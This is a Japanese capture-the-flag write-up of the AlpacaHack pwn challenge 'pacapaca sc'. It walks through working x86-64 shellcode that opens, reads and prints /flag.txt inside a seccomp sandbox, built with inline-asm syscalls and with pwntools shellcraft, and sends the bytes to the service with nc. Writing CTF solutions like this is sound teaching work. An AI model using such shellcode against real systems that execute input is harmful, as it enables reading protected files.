# pacapaca sc

https://alpacahack.com/daily/challenges/pacapaca-sc

## 問題の概要

`/flag.txt` を読み込んで出力する機械語のコードを送ればフラグを得られる PWN 問題です。

サーバーは入力したバイナリデータを機械語の命令列として実行してくれます。

具体的には、

- `mmap` で読み書き・実行可能な領域を確保
- そこに入力したバイナリを書き込む
- `seccomp` で呼び出し可能なシステムコールを `read`, `write`, `open`, `openat` に制限
- コードを実行

のような処理になっています。

## 解法

今回は C 言語で `/flag.txt` を読み込んで出力するコードを書いてみます。

外部ライブラリを使わないようにするため、syscall を直接呼び出す必要があります。

GCC では inline asm を使うことで、C 言語のコード内で直接機械語を呼び出すことができます。

```c
asm volatile (
    "アセンブリ文字列"
    : 出力オペランド
    : 入力オペランド
    : 破壊するもの(clobber)
);
```

入力・出力オペランドを指定することで、C 言語の変数とアセンブリコード内のレジスタを対応させることができます。

例えば、Linux x86-64 の syscall ABI に従って、第3引数まで指定してシステムコールを呼び出すコードは以下のようになります。

```c
asm volatile(
    "syscall"
    : "=a"(ret)     // 戻り値: rax
    : "a"(number),  // syscall 番号: rax
      "D"(arg1),    // 第1引数: rdi
      "S"(arg2),    // 第2引数: rsi
      "d"(arg3)     // 第3引数: rdx
    : "rcx", "r11", // syscall が破壊するレジスタ
      "memory" // メモリが影響を受ける可能性があることをコンパイラに伝える
);
```

syscall に関するドキュメントは `man 2 syscall`, `man 2 read`, `man 2 write`, `man 2 open` などで確認できます。

`"/flag.txt"` を `open` → `buf` に `read` → `stdout` に `write` するコードを書いてみました。

```c
#include <fcntl.h>
#include <sys/syscall.h>

#define BUF_SIZE 0x80

int main() {
    char buf[BUF_SIZE];
    char filename[] = "/flag.txt";
    int fd, len;

    asm volatile( // fd = open(filename, O_RDONLY, 0)
        "syscall"
        : "=a"(fd)
        : "a"(SYS_open), "D"(filename), "S"(O_RDONLY), "d"(0)
        : "rcx", "r11", "memory");

    asm volatile( // len = read(fd, buf, BUF_SIZE)
        "syscall"
        : "=a"(len)
        : "a"(SYS_read), "D"(fd), "S"(buf), "d"(BUF_SIZE)
        : "rcx", "r11", "memory");

    asm volatile( // write(1, buf, len)
        "syscall"
        :
        : "a"(SYS_write), "D"(1), "S"(buf), "d"(len)
        : "rcx", "r11", "memory");
}
```

コンパイルしてアセンブリを確認してみます。

```bash
$ gcc -O -c read.c && objdump -d read.o

read.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <main>:
   0:	48 83 ec 20          	sub    $0x20,%rsp
   4:	48 b8 2f 66 6c 61 67 	movabs $0x78742e67616c662f,%rax
   b:	2e 74 78
   e:	48 89 44 24 8e       	mov    %rax,-0x72(%rsp)
  13:	66 c7 44 24 96 74 00 	movw   $0x74,-0x6a(%rsp)
  1a:	48 8d 7c 24 8e       	lea    -0x72(%rsp),%rdi
  1f:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  25:	b8 02 00 00 00       	mov    $0x2,%eax
  2a:	44 89 c6             	mov    %r8d,%esi
  2d:	44 89 c2             	mov    %r8d,%edx
  30:	0f 05                	syscall
  32:	89 c7                	mov    %eax,%edi
  34:	48 8d 74 24 98       	lea    -0x68(%rsp),%rsi
  39:	ba 80 00 00 00       	mov    $0x80,%edx
  3e:	44 89 c0             	mov    %r8d,%eax
  41:	0f 05                	syscall
  43:	89 c2                	mov    %eax,%edx
  45:	b8 01 00 00 00       	mov    $0x1,%eax
  4a:	89 c7                	mov    %eax,%edi
  4c:	0f 05                	syscall
  4e:	b8 00 00 00 00       	mov    $0x0,%eax
  53:	48 83 c4 20          	add    $0x20,%rsp
  57:	c3                   	ret
```

いい感じに syscall を呼び出すコードが生成されていることがわかります。

試しにコンパイルしたプログラムを実行してみます。

```bash
$ gcc -O read.c && ./a.out
Alpaca{this is dummy flag located at /flag.txt}
```

syscall の呼び出しがちゃんと機能しました。

あとは `main` 関数のバイナリデータをサーバーに送ればフラグが得られます。

```bash
$ objcopy -j .text -O binary read.o /dev/stdout | nc localhost 1337
```

## pwntools の shellcraft を使ってみる

問題のヒントで pwntools の shellcraft が紹介されていたので、これを使用した shellcode の作成も試してみます。

shellcraft には典型的なシステムコールのテンプレートが用意されていて、shellcode を簡単に生成することができます。

例えば、`shellcraft.open("/flag.txt")` はファイルを開くためのアセンブリコードを生成します。

```python
from pwn import shellcraft
print(shellcraft.open("/flag.txt"))
# =>
#   /* open(file='/flag.txt', oflag=0, mode=0) */
#   /* push b'/flag.txt\x00' */
#   push 0x74
#   mov rax, 0x78742e67616c662f
#   push rax
#   mov rdi, rsp
#   xor edx, edx /* 0 */
#   xor esi, esi /* 0 */
#   /* call open() */
#   push SYS_open /* 2 */
#   pop rax
#   syscall
```

`asm()` 関数でアセンブリコードをアセンブルしてバイト列に変換できます。

open → read → write を行う shellcode を生成してみます。

open や read の戻り値は rax レジスタに入ります。スタックを少々破壊しますが、バッファのアドレスは rsp にします。

```python
from pwn import asm, context, shellcraft, disasm

context.arch = 'amd64'
context.os = 'linux'

code = shellcraft.open("/flag.txt")
code += shellcraft.read("rax", "rsp", 0x100)
code += shellcraft.write(1, "rsp", "rax")
bin = asm(code)
print(disasm(bin))

# =>
#    0:   6a 74                   push   0x74
#    2:   48 b8 2f 66 6c 61 67 2e 74 78   movabs rax, 0x78742e67616c662f
#    c:   50                      push   rax
#    d:   48 89 e7                mov    rdi, rsp
#   10:   31 d2                   xor    edx, edx
#   12:   31 f6                   xor    esi, esi
#   14:   6a 02                   push   0x2
#   16:   58                      pop    rax
#   17:   0f 05                   syscall
#   19:   48 89 c7                mov    rdi, rax
#   1c:   31 c0                   xor    eax, eax
#   1e:   31 d2                   xor    edx, edx
#   20:   b6 01                   mov    dh, 0x1
#   22:   48 89 e6                mov    rsi, rsp
#   25:   0f 05                   syscall
#   27:   6a 01                   push   0x1
#   29:   5f                      pop    rdi
#   2a:   48 89 c2                mov    rdx, rax
#   2d:   48 89 e6                mov    rsi, rsp
#   30:   6a 01                   push   0x1
#   32:   58                      pop    rax
#   33:   0f 05                   syscall
```
